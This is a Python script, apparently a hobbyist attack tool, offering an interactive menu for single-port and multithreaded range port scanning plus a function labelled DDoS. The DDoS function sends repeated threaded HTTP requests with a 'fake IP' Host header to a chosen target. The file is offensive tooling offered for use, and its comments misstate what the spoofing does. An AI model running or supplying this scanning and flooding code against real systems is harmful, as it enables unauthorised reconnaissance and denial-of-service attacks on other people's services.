import socket
import threading
import time

# Parameters to Configure:
fake_ip = "15.15.15.15"  # Fake IP address for DDoS attack
evil_packets = 1         # Number of packets to send in DDoS attack

# Global use
start_port = 0


# Single scan - 1 port
def single_scan():
    while True:
        ip = input("Enter IP: ")
        port = int(input("Enter port: "))
        # Socket open
        tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcpSocket.settimeout(1)
        # Socket Connection returns number for connection status. 0-Successful
        connection = tcpSocket.connect_ex((ip, port))
        # If connected successfully return 0 otherwise no connection was established.
        if connection == 0:
            print("Port ", port, " open")
        else:
            print("Port ", port, " closed.")
        # Menu: Scan again or EXIT
        while True:
            option = int(input("\n(1) Scan again.\n(2) EXIT\n"))
            if option == 1:
                break
            elif option == 2:
                return
            else:
                pass


# Ranged scan - port range
def range_scan():
    def r_scan(_ip, _end_port):
        global start_port
        # global list_open_ports
        while start_port <= _end_port:
            # Socket open
            tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpSocket.settimeout(1)
            # Socket Connection returns number for connection status. 0-Successful
            connection = tcpSocket.connect_ex((_ip, start_port))
            # If connected successfully return 0 otherwise no connection was established.
            if connection == 0:
                list_open_ports.append("Port {} open".format(start_port))
            start_port += 1
            tcpSocket.close()
    while True:
        list_open_ports = ["Open Port List:"]
        # Menu: Scan again or EXIT
        list_t = []
        ip = input("Enter IP: ")
        start_port = int(input("Start Port: "))
        end_port = int(input("End Port: "))
        start_time = time.time()
        for i in range(100):
            thread = threading.Thread(target=r_scan, args=(ip, end_port))
            list_t.append(thread)
            thread.start()
        print("Scanning.....")
        for i in list_t:
            i.join()
        end_time = time.time()
        print("\nScan Completed in: ", end_time - start_time, "\n")
        for i in list_open_ports:
            print(i)
        # Menu: Scan again or EXIT
        option = int(input("\n(1) Scan again.\n(2) EXIT\n"))
        if option == 1:
            break
        elif option == 2:
            return
        else:
            pass


# Denial of Service attack on specific port
def ddos():
    def denial(_ip, _port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_ip, _port))
            s.sendto(("GET /" + _ip + " HTTP/1.1\r\n").encode("ascii"), (_ip, _port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (_ip, _port))
            s.close()
            print("Sending Evil Packets!!!")
        except ConnectionRefusedError:
            print("Unreachable")
    while True:
        list_t = []
        ip = input("Enter IP: ")
        port = int(input("Enter port: "))
        # Send in multithreading
        for i in range(evil_packets):
            thread = threading.Thread(target=denial, args=(ip, port))
            list_t.append(thread)
            thread.start()
        for i in list_t:
            i.join()
        option = int(input("\n(1) Attack again.\n(2) EXIT\n"))
        if option == 1:
            continue
        elif option == 2:
            break
        else:
            break


# Beginning of the program / Main Menu
while True:
    print("Choose from options below: ")
    print("\n(1) Single Scan\n(2) Range Scan\n(3) DDoS\n\n(4) EXIT ")
    choice = input("")
    if choice == "1":
        single_scan()
    elif choice == "2":
        range_scan()
    elif choice == "3":
        ddos()
    elif choice == "4":
        exit()
    else:
        pass